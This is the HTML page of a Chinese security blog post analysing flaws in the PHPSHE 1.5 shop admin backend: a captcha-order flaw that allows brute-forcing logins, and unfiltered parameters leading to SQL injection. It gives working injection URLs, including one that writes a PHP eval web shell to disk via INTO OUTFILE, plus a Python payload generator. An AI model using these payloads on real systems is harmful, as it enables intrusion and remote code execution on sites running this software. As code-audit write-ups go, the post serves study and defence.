@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.2" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/noel.png?v=6.4.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/noel.png?v=6.4.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.2" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.4.2',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析">
+<meta name="keywords" content="PHP,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPSHE1.5漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/index.html">
+<meta property="og:site_name" content="Noel&#39;s Blog">
+<meta property="og:description" content="PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/00.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/01.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/02.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/03.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/04.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/05.png">
+<meta property="og:updated_time" content="2018-10-05T04:56:48.230Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHPSHE1.5漏洞分析">
+<meta name="twitter:description" content="PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析">
+<meta name="twitter:image" content="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/00.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PHPSHE1.5漏洞分析 | Noel's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Noel's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/05/PHPSHE1-5漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Noel">
+      <meta itemprop="description" content="I love u">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Noel's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHPSHE1.5漏洞分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-10-05 11:55:26 / 修改时间：12:56:48" itemprop="dateCreated datePublished" datetime="2018-10-05T11:55:26+08:00">2018-10-05</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span id="busuanzi_value_page_pv"></span>次阅读
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>PHPSHE1.5后台存在大量SQL注入漏洞，以及一些其他漏洞，这次就找一些来进行分析</p>
+<a id="more"></a>
+<h2 id="0x01-后台登陆逻辑漏洞"><a href="#0x01-后台登陆逻辑漏洞" class="headerlink" title="0x01 后台登陆逻辑漏洞"></a>0x01 后台登陆逻辑漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>后台登陆处无视验证码，可以进行爆破</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>密码输入错误时跳转到登陆界面</p>
+<p><img src="/2018/10/05/PHPSHE1-5漏洞分析/00.png" alt=""></p>
+<p>密码输入正确跳转的链接</p>
+<p><img src="/2018/10/05/PHPSHE1-5漏洞分析/01.png" alt=""></p>
+<p>可以根据返回内容不同进行爆破找到密码</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码位于/module/admin/do.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_p_pesubmit)) &#123;</span><br><span class="line">			$sql_set[<span class="string">'admin_name'</span>] = $_p_admin_name;</span><br><span class="line">			$sql_set[<span class="string">'admin_pw'</span>] = md5($_p_admin_pw);</span><br><span class="line">			<span class="keyword">if</span> ($info = $db-&gt;pe_select(<span class="string">'admin'</span>, pe_dbhold($sql_set))) &#123;</span><br><span class="line">				strtolower($_s_authcode) != strtolower($_p_authcode) &amp;&amp; pe_error(<span class="string">'验证码错误...'</span>);</span><br><span class="line">				$db-&gt;pe_update(<span class="string">'admin'</span>, <span class="keyword">array</span>(<span class="string">'admin_id'</span>=&gt;$info[<span class="string">'admin_id'</span>]), <span class="keyword">array</span>(<span class="string">'admin_ltime'</span>=&gt;time()));</span><br><span class="line">				$_SESSION[<span class="string">'admin_idtoken'</span>] = md5($info[<span class="string">'admin_id'</span>].$pe[<span class="string">'host_root'</span>]);</span><br><span class="line">				$_SESSION[<span class="string">'admin_id'</span>] = $info[<span class="string">'admin_id'</span>];</span><br><span class="line">				$_SESSION[<span class="string">'admin_name'</span>] = $info[<span class="string">'admin_name'</span>];</span><br><span class="line">				$_SESSION[<span class="string">'pe_token'</span>] = pe_token_set($_SESSION[<span class="string">'admin_idtoken'</span>]);</span><br><span class="line">				pe_success(<span class="string">'登录成功！'</span>, <span class="string">'admin.php'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				pe_error(<span class="string">'用户名或密码错误...'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$seo = pe_seo(<span class="string">'管理员登录'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'admin'</span>);</span><br><span class="line">		<span class="keyword">include</span>(pe_tpl(<span class="string">'do_login.html'</span>));</span><br></pre></td></tr></table></figure>
+<p>可以看到，这个登陆逻辑是先判断账号密码是否正确，之后再判断验证码是否正确</p>
+<h2 id="0x02-后台SQL注入"><a href="#0x02-后台SQL注入" class="headerlink" title="0x02 后台SQL注入"></a>0x02 后台SQL注入</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>在传递某些参数时未经过过滤，导致SQL注入</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="0x01-admin-php-mod-user"><a href="#0x01-admin-php-mod-user" class="headerlink" title="0x01 admin.php?mod=user"></a>0x01 admin.php?mod=user</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23</span><br></pre></td></tr></table></figure>
+<p>可以看到，注入成功，并且爆出了绝对路径</p>
+<p><img src="/2018/10/05/PHPSHE1-5漏洞分析/02.png" alt=""></p>
+<p>写入一句话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/phpshe1.5/admin.php?mod=user&amp;name=%27%20union%20select%20<span class="string">'&lt;?php @eval($_POST[a])?&gt;'</span>,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 into outfile <span class="string">"D:\\wamp64\\www\\phpshe1.5\\shell.php"</span>%23</span><br></pre></td></tr></table></figure>
+<p>可以看到一句话已经写入</p>
+<p><img src="/2018/10/05/PHPSHE1-5漏洞分析/03.png" alt=""></p>
+<p>使用菜刀连接</p>
+<p><img src="/2018/10/05/PHPSHE1-5漏洞分析/04.png" alt=""></p>
+<h4 id="0x02-admin-php-mod-user-amp-act-email"><a href="#0x02-admin-php-mod-user-amp-act-email" class="headerlink" title="0x02 admin.php?mod=user&amp;act=email"></a>0x02 admin.php?mod=user&amp;act=email</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/phpshe1.5/admin.php?mod=user&amp;act=email&amp;id=1<span class="string">') union select * from ((select user())A join (select user())b join (select user())c join (select user())d join (select user())e join (select user())f join (select user())g join (select user())h join (select user())i join (select user())j join (select user())k join (select user())l join (select user())m join (select user())n join (select user())o join (select user())p join (select user())q join (select user())r )#</span></span><br></pre></td></tr></table></figure>
+<p>利用成功</p>
+<p><img src="/2018/10/05/PHPSHE1-5漏洞分析/05.png" alt=""></p>
+<p>除了payload不一样外其余操作与上一个漏洞基本一样</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>代码位于/module/admin/user.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$_g_name &amp;&amp; $sqlwhere .= <span class="string">" and `user_name` like '%&#123;$_g_name&#125;%'"</span>;</span><br><span class="line">		$_g_phone &amp;&amp; $sqlwhere .= <span class="string">" and `user_phone` like '%&#123;$_g_phone&#125;%'"</span>;</span><br><span class="line">		$_g_email &amp;&amp; $sqlwhere .= <span class="string">" and `user_email` like '%&#123;$_g_email&#125;%'"</span>;</span><br><span class="line">		<span class="keyword">if</span> (in_array($_g_orderby, <span class="keyword">array</span>(<span class="string">'ltime|desc'</span>, <span class="string">'point|desc'</span>, <span class="string">'ordernum|desc'</span>))) &#123;</span><br><span class="line">			$orderby = explode(<span class="string">'|'</span>, $_g_orderby);</span><br><span class="line">			$sqlwhere .= <span class="string">" order by `user_&#123;$orderby[0]&#125;` &#123;$orderby[1]&#125;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$sqlwhere .= <span class="string">" order by `user_id` desc"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$info_list = $db-&gt;pe_selectall(<span class="string">'user'</span>, $sqlwhere, <span class="string">'*'</span>, <span class="keyword">array</span>(<span class="number">20</span>, $_g_page));</span><br><span class="line"></span><br><span class="line">		$tongji[<span class="string">'user'</span>] = $db-&gt;pe_num(<span class="string">'user'</span>);</span><br><span class="line">		$tongji[<span class="string">'useraddr'</span>] = $db-&gt;pe_num(<span class="string">'useraddr'</span>);</span><br><span class="line">		$tongji[<span class="string">'userbank'</span>] = $db-&gt;pe_num(<span class="string">'userbank'</span>);</span><br><span class="line">		$seo = pe_seo($menutitle=<span class="string">'会员列表'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'admin'</span>);</span><br><span class="line">		<span class="keyword">include</span>(pe_tpl(<span class="string">'user_list.html'</span>));</span><br></pre></td></tr></table></figure>
+<p>$_g_name是定义在common.php文件中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">	!<span class="keyword">empty</span>($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, <span class="string">'_g'</span>);</span><br><span class="line">	!<span class="keyword">empty</span>($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, <span class="string">'_p'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	!<span class="keyword">empty</span>($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,<span class="string">'_g'</span>);</span><br><span class="line">	!<span class="keyword">empty</span>($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,<span class="string">'_p'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>extract将GET与POST的参数加上_g_并成为变量,并未做防范sql注入的过滤</p>
+<p>所以构造payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod=user&amp;name=%27%20union%20select%20user(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23</span><br></pre></td></tr></table></figure>
+<p>即可</p>
+<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>代码同样位于/module/admin/user.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'email'</span>:</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_p_pesubmit)) &#123;</span><br><span class="line">			pe_token_match();</span><br><span class="line">			!$_p_email_user &amp;&amp; pe_error(<span class="string">'收件人必须填写...'</span>);</span><br><span class="line">			!$_p_email_name &amp;&amp; pe_error(<span class="string">'邮件标题必须填写...'</span>);</span><br><span class="line">			!$_p_email_text &amp;&amp; pe_error(<span class="string">'邮件内容必须填写...'</span>);</span><br><span class="line">			$email_user = explode(<span class="string">','</span>, $_p_email_user);</span><br><span class="line">			<span class="keyword">foreach</span> ($email_user <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!$v) <span class="keyword">continue</span>;</span><br><span class="line">				$noticelog_list[$k][<span class="string">'noticelog_user'</span>] = pe_dbhold($v);</span><br><span class="line">				$noticelog_list[$k][<span class="string">'noticelog_name'</span>] = pe_dbhold($_p_email_name);</span><br><span class="line">				$noticelog_list[$k][<span class="string">'noticelog_text'</span>] = $_p_email_text;</span><br><span class="line">				$noticelog_list[$k][<span class="string">'noticelog_atime'</span>] = time();			</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($db-&gt;pe_insert(<span class="string">'noticelog'</span>, $noticelog_list)) &#123;</span><br><span class="line">				pe_success(<span class="string">'发送成功!'</span>, <span class="string">''</span>, <span class="string">'dialog'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				pe_error(<span class="string">'发送失败...'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$info_list = $db-&gt;pe_selectall(<span class="string">'user'</span>, <span class="keyword">array</span>(<span class="string">'user_id'</span>=&gt;explode(<span class="string">','</span>, $_g_id)));</span><br><span class="line">		$email_user = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">foreach</span> ($info_list <span class="keyword">as</span> $v) &#123;</span><br><span class="line">			$v[<span class="string">'user_email'</span>] &amp;&amp; $email_user[] = $v[<span class="string">'user_email'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		$seo = pe_seo($menutitle=<span class="string">'发送邮件'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">'admin'</span>);</span><br><span class="line">		<span class="keyword">include</span>(pe_tpl(<span class="string">'user_email.html'</span>));</span><br></pre></td></tr></table></figure>
+<p>其中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$info_list = $db-&gt;pe_selectall(<span class="string">'user'</span>, <span class="keyword">array</span>(<span class="string">'user_id'</span>=&gt;explode(<span class="string">','</span>, $_g_id)));</span><br></pre></td></tr></table></figure>
+<p>的$_g_id直接GET到后未进行过滤，不过有一个explode函数使得union select不太好使了，恰巧有个不用逗号的方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from ((select user())A join (select user())b join (select user())c)</span><br></pre></td></tr></table></figure>
+<p>附上一段构造payload的python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#union select * from ((select 1)A join (select 2)B join (select 3)C);</span></span><br><span class="line"><span class="comment">#Max length 26</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_payload</span><span class="params">(col_length,content)</span>:</span></span><br><span class="line">	payload = <span class="string">"union select * from ((select &#123;0&#125;)A "</span>.format(content)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(col_length<span class="number">-1</span>):</span><br><span class="line">		payload += <span class="string">"join (select &#123;0&#125;)&#123;1&#125; "</span>.format(content,dic[i+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">	payload += <span class="string">")"</span></span><br><span class="line">	print(payload)</span><br><span class="line"></span><br><span class="line">print_payload(<span class="number">18</span>,<span class="string">"user()"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>果然爆破才是最强的</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/04/Vulnhub-JJS-CTF/" rel="next" title="Vulnhub JJS-CTF">
+                <i class="fa fa-chevron-left"></i> Vulnhub JJS-CTF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Noel</p>
+              <p class="site-description motion-element" itemprop="description">I love u</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://norw1nd.github.io/" title="Norw1nd" target="_blank">Norw1nd</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://Xvgeng.github.io/" title="Xvgeng" target="_blank">Xvgeng</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-后台登陆逻辑漏洞"><span class="nav-number">1.</span> <span class="nav-text">0x01 后台登陆逻辑漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-后台SQL注入"><span class="nav-number">2.</span> <span class="nav-text">0x02 后台SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞描述-1"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-admin-php-mod-user"><span class="nav-number">2.2.1.</span> <span class="nav-text">0x01 admin.php?mod=user</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-admin-php-mod-user-amp-act-email"><span class="nav-number">2.2.2.</span> <span class="nav-text">0x02 admin.php?mod=user&amp;act=email</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01"><span class="nav-number">2.3.1.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02"><span class="nav-number">2.3.2.</span> <span class="nav-text">0x02</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-总结"><span class="nav-number">3.</span> <span class="nav-text">0x03 总结</span></a></li></ol></div>
+            
+
